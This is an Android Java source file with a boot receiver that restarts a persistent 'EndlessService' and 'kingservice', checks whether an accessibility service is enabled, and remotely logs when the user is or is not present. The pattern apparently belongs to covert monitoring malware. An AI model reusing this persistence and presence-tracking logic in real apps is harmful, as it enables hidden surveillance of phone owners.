package com.service.app.Main;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.service.app.Services.Access;
import com.service.app.Services.EndlessService;
import com.service.app.Services.kingservice;
import com.service.app.Services.utils;
import com.service.app.defines;

import java.util.ArrayList;
import java.util.List;

public class BootReceiverService extends BroadcastReceiver {
    private final static String TAG = BootReceiverService.class.getSimpleName();

    utils utl = new utils();
    defines consts = new defines();

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "onReceive");

        List<String> bootIntents = new ArrayList<String>();
        bootIntents.add(Intent.ACTION_BOOT_COMPLETED);
        bootIntents.add(Intent.ACTION_REBOOT);
        bootIntents.add(Intent.ACTION_LOCKED_BOOT_COMPLETED);

        List<String> userPresentActions = new ArrayList<String>();
        userPresentActions.add(Intent.ACTION_USER_PRESENT);

        List<String> userNotPresentActions = new ArrayList<String>();
        userNotPresentActions.add(Intent.ACTION_SCREEN_OFF);

        utl.startKingService(context);

        if (bootIntents.contains(intent.getAction())) {
            if (!utl.isAccessibilityServiceEnabled(context, Access.class)) {
                if (!utl.SettingsRead(context, "endlessServiceStatus").equals("running")) {
                    if (Build.VERSION.SDK_INT >= 26) {
                        Log.d(TAG, "Starting the service in >=26 Mode from a BroadcastReceiver");
                        utl.runForegroundService(context, EndlessService.class, "start");
                    } else {
                        Log.d(TAG, "Starting the service in < 26 Mode from a BroadcastReceiver");
                        utl.runService(context, EndlessService.class, "start");
                    }
                }
            }
        } else if (userPresentActions.contains(intent.getAction())) {
            utl.RemoteLog(context, "BootReceiverService: User present");
            Log.d(TAG, "USER_PRESENT");
            utl.SettingsWrite(context, consts.userPresent, "1");
        } else if (userNotPresentActions.contains(intent.getAction())) {
            utl.RemoteLog(context, "BootReceiverService: User not present");
            Log.d(TAG, "USER_NOT_PRESENT");
            utl.SettingsWrite(context, consts.userPresent, "0");
        }
    }
}
